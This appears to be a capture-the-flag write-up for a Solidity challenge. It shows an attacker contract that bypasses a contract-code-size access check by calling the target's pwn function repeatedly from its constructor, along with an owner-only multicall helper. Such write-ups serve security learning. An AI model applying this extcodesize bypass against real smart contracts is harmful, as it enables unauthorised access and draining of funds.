# MockAccessControl
### Challenge
 -  To pass contract bytecode size check

### Solution
 - can be bypassed by calling inside a constructor
```js
contract MinionAttacker is Ownable{
    constructor (Minion target,uint256 amt2Fwd) payable  {
        for(uint i=0; i<5; i++){
            target.pwn{value: amt2Fwd}();
        }
    }
    struct Call { address target; bytes callData; }
    struct Result { bool success; bytes returnData; }
    // To execute calls after deployment 
    // called by only owner
    function call(bool requireSuccess, Call[] memory calls) external onlyOwner returns (Result[] memory returnData) {
        returnData = new Result[](calls.length);
        for(uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);

            if (requireSuccess) {
                require(success, " MinionAttacker# call failed");
            }

            returnData[i] = Result(success, ret);
        }
    }  
}
```
